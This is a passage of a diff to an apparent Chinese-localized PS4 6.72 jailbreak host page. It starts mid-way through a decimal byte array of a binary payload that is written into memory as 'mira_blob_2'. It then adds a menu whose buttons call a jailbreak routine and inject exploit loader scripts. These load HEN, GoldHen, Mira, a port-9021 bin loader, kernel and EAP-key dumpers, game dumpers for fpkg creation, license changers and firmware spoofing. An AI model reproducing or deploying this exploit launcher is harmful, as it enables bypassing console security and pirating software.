0,115,116,114,108,101,110,0,115,116,114,99,109,112,0,115,116,114,110,99,109,112,0,115,112,114,105,110,116,102,0,115,110,112,114,105,110,116,102,0,115,115,99,97,110,102,0,115,116,114,99,104,114,0,115,116,114,114,99,104,114,0,115,116,114,115,116,114,0,115,116,114,100,117,112,0,114,105,110,100,101,120,0,105,115,100,105,103,105,116,0,97,116,111,105,0,115,116,114,108,99,112,121,0,115,116,114,101,114,114,111,114,0,95,71,101,116,112,99,116,121,112,101,0,95,83,116,111,117,108,0,98,99,111,112,121,0,115,114,97,110,100,0,97,115,99,116,105,109,101,0,97,115,99,116,105,109,101,95,114,0,103,109,116,105,109,101,0,103,109,116,105,109,101,95,115,0,108,111,99,97,108,116,105,109,101,0,108,111,99,97,108,116,105,109,101,95,114,0,109,107,116,105,109,101,0,111,112,101,110,100,105,114,0,114,101,97,100,100,105,114,0,114,101,97,100,100,105,114,95,114,0,116,101,108,108,100,105,114,0,115,101,101,107,100,105,114,0,114,101,119,105,110,100,100,105,114,0,99,108,111,115,101,100,105,114,0,100,105,114,102,100,0,103,101,116,112,114,111,103,110,97,109,101,0,102,111,112,101,110,0,102,114,101,97,100,0,102,119,114,105,116,101,0,102,115,101,101,107,0,102,116,101,108,108,0,102,99,108,111,115,101,0,102,112,114,105,110,116,102,0,115,99,101,80,116,104,114,101,97,100,67,114,101,97,116,101,0,115,99,101,80,116,104,114,101,97,100,69,120,105,116,0,115,99,101,80,116,104,114,101,97,100,68,101,116,97,99,104,0,115,99,101,80,116,104,114,101,97,100,74,111,105,110,0,115,99,101,80,116,104,114,101,97,100,89,105,101,108,100,0,115,99,101,80,116,104,114,101,97,100,83,101,108,102,0,115,99,101,80,116,104,114,101,97,100,67,97,110,99,101,108,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,73,110,105,116,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,68,101,115,116,114,111,121,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,76,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,84,114,121,108,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,84,105,109,101,100,108,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,85,110,108,111,99,107,0,108,105,98,107,101,114,110,101,108,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,119,101,98,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,115,121,115,46,115,112,114,120,0,95,95,115,116,97,99,107,95,99,104,107,95,103,117,97,114,100,0,95,95,115,116,97,99,107,95,99,104,107,95,102,97,105,108,0,95,95,101,114,114,111,114,0,115,99,101,75,101,114,110,101,108,69,114,114,111,114,0,115,99,101,75,101,114,110,101,108,76,111,97,100,83,116,97,114,116,77,111,100,117,108,101,0,115,99,101,75,101,114,110,101,108,65,108,108,111,99,97,116,101,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,77,97,112,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,71,101,116,68,105,114,101,99,116,77,101,109,111,114,121,83,105,122,101,0,115,99,101,75,101,114,110,101,108,83,116,97,116,0,115,99,101,75,101,114,110,101,108,79,112,101,110,0,115,99,101,75,101,114,110,101,108,82,101,97,100,0,115,99,101,75,101,114,110,101,108,76,115,101,101,107,0,115,99,101,75,101,114,110,101,108,67,108,111,115,101,0,115,99,101,75,101,114,110,101,108,83,108,101,101,112,0,115,99,101,75,101,114,110,101,108,85,115,108,101,101,112,0,115,99,101,75,101,114,110,101,108,71,101,116,116,105,109,101,111,102,100,97,121,0,115,99,101,75,101,114,110,101,108,71,101,116,80,114,111,99,101,115,115,84,105,109,101,0,115,99,101,75,101,114,110,101,108,71,101,116,67,117,114,114,101,110,116,67,112,117,0,115,121,115,99,116,108,0,115,121,115,99,116,108,98,121,110,97,109,101,0,115,121,115,97,114,99,104,0,101,120,101,99,118,101,0,112,116,104,114,101,97,100,95,115,101,108,102,0,112,116,104,114,101,97,100,95,115,101,116,97,102,102,105,110,105,116,121,95,110,112,0,115,99,101,75,101,114,110,101,108,67,114,101,97,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,68,101,108,101,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,65,100,100,85,115,101,114,69,118,101,110,116,0,115,99,101,75,101,114,110,101,108,65,100,100,82,101,97,100,69,118,101,110,116,0,103,101,116,117,105,100,0,103,101,116,103,105,100,0,103,101,116,112,105,100,0,115,101,116,117,105,100,0,115,101,116,103,105,100,0,115,101,116,114,101,117,105,100,0,115,101,116,114,101,103,105,100,0,47,108,105,98,54,52,47,108,100,45,108,105,110,117,120,45,120,56,54,45,54,52,46,115,111,46,50,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,245,254,255,111,0,0,0,0,152,24,32,38,9,0,0,0,5,0,0,0,0,0,0,0,144,24,32,38,9,0,0,0,6,0,0,0,0,0,0,0,120,24,32,38,9,0,0,0,10,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,11,0,0,0,0,0,0,0,24,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,251,255,255,111,0,0,0,0,1,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
+window.mira_blob_2_len = 0x1998;
+window.mira_blob_2 = malloc(window.mira_blob_2_len);
+write_mem(window.mira_blob_2, payload);}
 
-			h1 {
-				font-family: Impact, Charcoal, sans-serif;
-				font-size: 6rem;	
-				color: #4d4dff;
-				margin:5px;
-			}
+</script>
+<script>
+    function showdate() {
+  var dt = new Date();
+    Hour= dt.getHours();
+  Minute= dt.getMinutes();
+     Day=dt.getDate();
+   Month=dt.getMonth()+1;
+   Year=dt.getFullYear();
+if (Minute < 10) { Minute = "0" + Minute; };
+if (Hour < 10) { Hour = "0" + Hour; };
+document.getElementById("date").innerHTML = (Year+"/"+Month+"/"+Day);
+document.getElementById("clock").innerHTML = (Hour+":"+Minute);
+  }
+  
+  setInterval(showdate,0);
+</script>
+</head>
+<body style='background-color:#1A1920'>
+<div id=ScrOverlay class=cacheUPDbg><pre id=cacheUPDtxt class=cacheUPD></pre>
+<div id=CacheProgress><div id=CacheBar></div></div></div>
+<br><span id="date" ></span><span id="clock" ></span><h1 style='font-size:30px;text-align:center;text-shadow: 4px 4px 4px black;color:yellow;'><a class="button" style="color: green;text-shadow: 4px 4px 4px black;font-size:120%; font-weight: bold;">成功 = <span id=passCounter></span></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Karo 破解服务 6.72 版本 v2.4.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a  class="button2" style="color: red;text-shadow: 4px 4px 4px black;font-size:120%; font-weight: bold;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 失败 = <span id=failCounter></span> </a>
+<br>
+<h1 id=msgs2 style='font-size:25px;text-align:center;text-shadow: 4px 4px 4px black;color:white;'>请选择功能</h1>
 
-			main {
-				justify-content: space-around;	
-				-webkit-justify-content: space-around;
-			}
+<div id="karo" style="display:none">
+<div id="loader" ><div id="msgs" class="txt1"></div>
+<div class="AniGif"><div id=ldbar class=Ani0></div></div>
+<div id="txt2" class="txt2"><script>document.write("破解功能对应系统 6.72");</script></div></div>
+<div id="done" style="display:none" ><div class="txt1"><script>document.write("破解功能");</script> 已加载 <div id="Tick"></div>，请按 <div id="PSBUTTON"></div> 退出.</div><div class="container"><div class=AniDone></div></div><div class="txt2"><script>document.write("破解功能对应系统 6.72");</script></div></div>
+</div>
+<div id="karox" style="display:none">
+<div id="loaderx"><div id="txt1" class="txt1">正在加载漏洞 ...</div>
+<div class="AniGif"><div id=ldbarx class=Ani1></div></div>
+<div class="txt2"><script>document.write("破解功能对应系统 6.72");</script></div></div>
+<div id="donex" style="display:none"><div class="txt1"><script>document.write("破解功能");</script> 已加载 <div id="Tick"></div>，请按 O 退出.</div><div class="container"><div class=AniDone></div></div><div class="txt2"><script>document.write("破解功能对应系统 6.72");</script></div></div>
+<div id="failx" style="display:none" class="txt1">破解功能加载失败 !<br>请重启主机后再试一次</div>
+</div>
+<div style="text-align:center"  id="MyItems">
+<br>
+<button style='font-size:22px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='HEN 2.1.3 开发者 By SiSTRO'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_hen('hen213.bin'); return false">&nbsp;&nbsp;Hen_v2.1.3&nbsp;&nbsp; </button>
+<button style='font-size:22px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='HEN 2.1.3 开发者 By SiSTRO & Leeful'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_hen('hen213b.bin'); return false">&nbsp;Hen_v2.1.3b&nbsp; </button>
+<button style='font-size:25px;text-align:center;font-weight: bold;text-shadow: 4px 4px 4px black;color:#CEC52A' class="pointer" onMouseOver="msgs2.innerHTML='GoldHen v2.1 开发者 By SiSTRO'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_hen('goldhen21672.bin'); return false">&nbsp;GoldHenV2.1&nbsp; </button>
+<button style='font-size:22px;text-align:center;background-color:#FFD700;text-shadow: 2px 2px 2px black;color:red' class="pointer" onMouseOver="msgs2.innerHTML='GoldHen v2.2.5b7 开发者 By SiSTRO'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_hen('goldhen_2.2.5b7_672.bin'); return false">GoldHen2.2.5b7</button>
+<button style='font-size:23px;text-align:center;font-weight: bold;text-shadow: 4px 4px 4px black;color:#CEC52A' class="pointer" onMouseOver="msgs2.innerHTML='GoldHen v2.2.4 开发者 By SiSTRO'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_hen('goldhen_2.2.4_672.bin'); return false">GoldHenV2.2.4</button>
+<button style='font-size:25px;text-align:center;font-weight: bold;text-shadow: 4px 4px 4px black;color:#CEC52A' class="pointer" onMouseOver="msgs2.innerHTML='GoldHen v2.0b2 开发者 By SiSTRO'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_hen('goldhen2b2672.bin'); return false">GoldHenV2b2</button>
+<button style='font-size:22px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='Mira 开发者 By OrbisTeam'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_mira('mira.elf'); return false">&nbsp;Mira.Orbis&nbsp; </button>
+<br><br>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='加载发送到 PS4 IP 地址 9021 端口的 bin 文件'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_binloader(); return false"> Bin 加载器 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='具有完全访问 PS4 权限的 FTP 服务器'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_FTP.bin'); return false"> FTP 服务器 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='仅将游戏转储到 USB 驱动器以便能够创建 fpkg 文件'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_DumperG.bin'); return false"> 转储游戏 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='仅将游戏数更新据转储到 USB 驱动器以便能够创建 fpkg 文件'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_DumperU.bin'); return false"> 转储更新</button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将 游戏+更新 转储到 USB 驱动器，以便能够创建 fpkg 文件'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_DumperGU.bin'); return false"> 转储 G+U </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='转储 游戏+更新 并合并到 USB 驱动器以能够创建 fpkg 文件'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_DumperM.bin'); return false"> 合并转储</button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将内核副本转储到 USB 驱动器'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_kernelDumper.bin'); return false"> 转储内核 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='头像转储与导入 v2'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('avatar.bin'); return false"> 头像导入器 </button>
+<br><br>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='禁用在 PS4 网络浏览器中使用的最后一页的自动打开功能'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_historyBlocker.bin'); return false"> 历史拦截 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将已安装的游戏移至外部 USB 驱动器'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_app2usb.bin'); return false"> App2USB </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='在没有足够大的 USB 驱动器的情况下安装 .pkg 文件'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_fakeusb.bin'); return false"> 伪装USB </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将您的 EAP KEY 转储到 USB 驱动器'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl.PS4-EAP-KEY-DUMPER.bin'); return false"> EAP.Key </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将已安装的游戏许可证类型从 FAKE 更改为 FREE (AIAzif)'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('rifrenamer.bin'); return false"> Rif.重签名 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='从 USB 运行 Linux 安装的 Linux 加载器'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_linux.bin'); return false"> Linux.USB </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='Linux 加载器 baikal 版'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('linuxbaikal.bin'); return false"> Linux:Baikal </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='从内部硬盘引导 Linux'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('linuxhdd.bin'); return false"> Linux.内置 </button>
+<br><br>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='在 PS4 更新文件夹中创建虚拟文件以屏蔽系统升级功能'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_updatesDisable.bin'); return false">屏蔽升级</button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='删除 PS4 更新文件夹中的虚拟文件以恢复系统升级功能'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_updatesEnable.bin'); return false"> 恢复升级 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='创建重要数据库文件和用户数据的备份'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('DB_SG_Backup.bin'); return false"> 备份数据 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='恢复数据库文件和用户数据的备份'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('DB_SG_Restore.bin'); return false"> 恢复备份 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='解锁 测试机 上可用的一些调试功能'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_ToDEX.bin'); return false"> 测试机菜单 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将 Target ID 转换为 开发机 的 0x81'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_ToDEV.bin'); return false"> 转为开发机 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将 Target ID 转换为 Arcade 或 Kratos 模型的 0xA0'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_ToKratos.bin'); return false"> 转为 Kratos </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='保存数据管理器'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('pl_ps4debug.bin'); return false"> PS4调试 </button>
+<br><br>
+<button style='font-size:20px;text-align:center;background-color:blue;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='为您的 PS4 游戏提供大量金手指'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('WebRTE.bin'); return false"> 网页金手指 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='更改 PS4 的内部时钟'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('kernel_clock.bin'); return false"> 核心时钟</button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='备份奖杯'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('Trophy_Backup.bin'); return false"> 备份奖杯</button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='恢复奖杯'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('Trophy_Restore.bin'); return false"> 恢复奖杯</button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='从 USB 恢复主机缓存的备份文件'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('cache.bin'); return false"> 恢复离线缓存 </button>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='网页版 ID 激活与编辑，注意修改 ID 后会造成原有存档失效'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_web(); return false"> 离线ID激活器 </button>
+<button style='font-size:22px;text-align:center;text-shadow: 4px 4px 4px black;background-color:red;color:white' class="pointer" onMouseOver="msgs2.innerHTML='Orbis 工具箱加载器 开发者 Alfa 1190'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_Pl('Orbis-Toolbox-672.bin'); return false">&nbsp;Orbis 工具箱&nbsp; </button>
+<br><br>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='将系统版本伪装为 X.XX '"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_SPF(); return false"> 版本伪装 </button><select style='font-size:20px;text-align:center;color:black' id="fws1"></select><select style='font-size:20px;text-align:center;color:black' id="fws2"></select>
+<button style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white' class="pointer" onMouseOver="msgs2.innerHTML='设置 PS4 风扇启动加速所需的温度'"; onmouseout="msgs2.innerHTML='请选择功能'" onclick="load_fanthresh(); return false"> 设置风扇 </button><select style='font-size:20px;text-align:center;color:black' id="tempC"></select><a style='font-size:17px;text-align:center;color:white;'>&#176;C</a><br><a style='font-size:20px;text-align:center;text-shadow: 4px 4px 4px black;color:white;'> PS4 默认加速温度是 79&#176;C</a>
+<br>
 
-			.owl-carousel{
-				display: -webkit-box;  /* OLD - iOS 6-, Safari 3.1-6, BB7 */
-				display: -ms-flexbox;  /* TWEENER - IE 10 */
-				display: -webkit-flex; /* NEW - Safari 6.1+. iOS 7.1+, BB10 */
-				display: flex;         /* NEW, Spec - Firefox, Chrome, Opera */
-				flex-flow: row wrap;
-				justify-content: space-around;	
-				-webkit-justify-content: space-around;
-			}
+<h1 style='text-align:center;'><a style='font-size:20px;text-align:center;color:#FFD700;'>设计: <a class="hue" style='font-size:20px;text-align:center;color:white;text-shadow: 4px 4px 4px black;'>Karo Sharifi .<a style='font-size:20px;text-align:center;color:#FFD700;'> 特别感谢 :<a style='font-size:20px;text-align:center;color:white;'>Sleirsgoevy ,Leeful , AlAzif , SiSTRo. <a style='font-size:20px;text-align:center;color:#FFD700;'> 汉化&制作 :<a style='font-size:20px;text-align:center;color:white;'> 上帝之右手 </a><br></h1><br>
+</div>
+<script>
+for(var i=1; i<=99; i++){var select1 = document.getElementById("fws1"); var option1 = document.createElement("OPTION"); select1.options.add(option1); option1.text = i; option1.value = i;}
+fws1.value=9;
+for(var i=00; i<=99; i++){var select2 = document.getElementById("fws2"); var option2 = document.createElement("OPTION"); select2.options.add(option2); option2.text = ("0" + i).slice(-2); option2.value = i;}
+fws2.value=00;
+</script>
+<script>
+for(var i=40; i<=79; i++){var select = document.getElementById("tempC"); var option = document.createElement("OPTION"); select.options.add(option); option.text = i; option.value = i;}
+tempC.value=79;
+</script>
+<script>
+if (localStorage.passcount == null) localStorage.passcount=0;
+window.passCounter.innerHTML=localStorage.passcount;
+if (localStorage.failcount == null) localStorage.failcount=0;
+window.failCounter.innerHTML=localStorage.failcount;
 
-			#infoWrapper{
-				width:100%;
-				display: -webkit-box;  /* OLD - iOS 6-, Safari 3.1-6, BB7 */
-				display: -ms-flexbox;  /* TWEENER - IE 10 */
-				display: -webkit-flex; /* NEW - Safari 6.1+. iOS 7.1+, BB10 */
-				display: flex;         /* NEW, Spec - Firefox, Chrome, Opera */
-				justify-content: space-around;	
-				-webkit-justify-content: space-around;
-			}
+function load_hen(x) {
+PLfile=x;
+karox.style.display = 'block';MyItems.style.display='none';
+setTimeout(function(){var script = document.createElement('script');script.src ="exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);},3000);
+setTimeout(parent.jailbreak,500);
+}
+function load_mira(x) {
+PLfile=x;
+karox.style.display = 'block';MyItems.style.display='none';
+setTimeout(function(){var script = document.createElement('script');script.src ="m_loader.js";document.getElementsByTagName('head')[0].appendChild(script);},3000);
+setTimeout(parent.jailbreak,500);
+}
+function load_binloader(){
+karo.style.display = 'block';MyItems.style.display='none';
+msgs.innerHTML="<div>正在加载 Bin加载器...</div>"; txt2.innerHTML="加载成功后, 请发送有效载荷到端口 9021";
+var script = document.createElement('script');script.src = "pl_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+}
+function load_Pl(x){
+PLfile=x;
+karo.style.display = 'block';MyItems.style.display='none';
+msgs.innerHTML="<div>正在加载破解功能...</div>";
+var script = document.createElement('script');script.src = "pls_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+}
 
-			.divExploitOption {
-				margin: 10px;
-				border-radius: 10px;
-				border: 5px solid #000;
-				width: 195px;
-			}
+function load_SPF(){
+karo.style.display = 'block';MyItems.style.display='none';
+msgs.innerHTML="<div>正在加载版本伪装功能 ...</div>";txt2.innerHTML="版本伪装功能对应系统 6.72";
+fw1=parseInt(fws1.value,16);fw2=parseInt(fws2.value,16);
+spoof();
+var script = document.createElement('script');script.src = "pl_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+}
+function load_fanthresh(){
+karo.style.display = 'block';MyItems.style.display='none';
+msgs.innerHTML="<div>正在加载风扇阈值 ...</div>";txt2.innerHTML="风扇控制功能对应系统 6.72";
+fanTemp=tempC.value;
+fan();
+var script = document.createElement('script');script.src = "pl_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+}
+function load_web(){
+MyItems.style.display = "none";
+msgs2.innerHTML="<div>正在加载离线ID激活器. 请等待 ...</div>";
+var script = document.createElement('script');script.src = "payload.js";document.getElementsByTagName('head')[0].appendChild(script);
+var script = document.createElement('script');script.src = "pl_loader2.js";document.getElementsByTagName('head')[0].appendChild(script);
 
-			.divExploitInfo {
-				margin: 10px;
-				border-radius: 10px;
-				border: 5px solid #000;
-				width: 95%;
-			}
-
-			.divMenuHeader {
-				font-family: Impact, Charcoal, sans-serif;
-				font-size: 30px;
-				padding: 0px;
-				text-align: center;
-				background: #f0f0f5;	
-				border-radius: 5px;
-				border: 1px solid black;
-				align:center;	
-			}
-
-			#exploitInfo {
-				font-family: Impact, Charcoal, sans-serif;
-				font-size: 25px;
-				text-align: left;
-				margin: 20px;
-			}
-
-			.divMenuBody {
-				margin: 10px;
-				text-align: center;	
-			}
-
-			footer {
-				font-family: Impact, Charcoal, sans-serif;
-				font-size: 25px;
-				text-align: center;
-			}
-
-			.nav {	
-				height: 100px;
-				width: 100px;	
-			}
-
-			.nav:hover {	
-				fill: #f00;	
-			}
-
-			.owl-carousel {
-				width: 90%;
-				margin: auto;
-			}
-		
-			#svg-nav-672-prev, #svg-nav-672-next {
-				width: 50px;
-				height: 50px;
-			}
-
-			.owl-prev-672 {
-				width: 50px;
-				height: 50px;
-				position: absolute;
-				top: 40%;
-				left: -60px;
-				display: block!IMPORTANT;
-				background-color: Transparent;
-				border: none;
-			}
-
-			.owl-next-672 {
-				width: 50px;
-				height: 50px;
-				position: absolute;
-				top: 40%;
-				right: -40px;
-				display: block!IMPORTANT;
-				background-color: Transparent;
-				border: none;
-			}
-			
-			@media screen and (max-width: 1024px) {
-				h1 {
-					font-family: Impact, Charcoal, sans-serif;
-					font-size: 2.5rem;	
-					color: #4d4dff;		
-				}
-			}
-
-			@media screen and (max-width: 480px) {
-				h1 {
-					font-family: Impact, Charcoal, sans-serif;
-					font-size: 2.5rem;	
-					color: #4d4dff;		
-				}
-			}
-
-			svg {
-				height: 150px;
-				width: 150px;
-			}
-
-			#back svg {
-				height: 75px;
-				width: 75px;
-			}			
-			
-			svg:hover path { fill: #f00; }
-			svg:hover polygon { fill: #f00; }
-
-			button:hover svg {
-				fill: #f00;
-			}
-		
-		
-			#exploitSelectorDialog {
-				z-index: 100;
-				margin: 10px;
-				border-radius: 10px;
-				border: 5px solid black;			
-				position: fixed;
-				margin: auto;
-				top: 12px;
-				left: 0;
-				right: 0;
-				bottom: 0;
-				width: 1300px;
-				height: 600px;
-				background-color: #ffffff;			
-				opacity: 1;				
-				visibility:hidden;
-			}
-		
-			#exploitSelectorOverlay {
-				visibility: hidden;
-				position: absolute;
-				left: 0px;
-				top: 0px;
-				width:100%;
-				height:100%;
-				text-align:center;
-				z-index: 50;
-				background: rgba(0, 0, 0, 0.5);
-			}		
-			
-			#exploitSelectorInfoText{
-				font-family:Impact, Charcoal, sans-serif;
-				font-size: 25px;
-				margin: 10px;
-				text-align:left;
-			}
-			
-			#exploitSelectorInfoText input{
-				margin-left: 25px;
-			}			
-		
-			#saveSelectedExploitButton {
-				visibility:hidden;
-				border-radius: 8px;
-				border: 2px solid black;
-				background-color: #e7e7e7; 
-				color: black;
-				padding: 5px;
-				text-align: center;
-				text-decoration: none;
-				display: inline-block;
-				font-size: 16px;
-				margin: 4px 4px;
-			}
-		
-		
-		
-			/* Ribbons */
-
-			.corner-ribbon{
-				font-size: 25px;
-			  width: 200px;
-			  background: #e43;
-			  position: absolute;
-			  top: 25px;
-			  left: -50px;
-			  text-align: center;
-			  line-height: 50px;
-			  letter-spacing: 1px;
-			  color: #f0f0f0;
-			  transform: rotate(-45deg);
-			  -webkit-transform: rotate(-45deg);
-			}
-
-			/* Custom styles */
-
-			.corner-ribbon.sticky{
-			  position: fixed;
-			}
-
-			.corner-ribbon.shadow{
-			  box-shadow: 0 0 3px rgba(0,0,0,.3);
-			}
-
-			/* Different positions */
-
-			.corner-ribbon.top-left{
-			  top: 25px;
-			  left: -50px;
-			  transform: rotate(-45deg);
-			  -webkit-transform: rotate(-45deg);
-			}
-
-			.corner-ribbon.top-right{
-			  top: 25px;
-			  right: -50px;
-			  left: auto;
-			  transform: rotate(45deg);
-			  -webkit-transform: rotate(45deg);
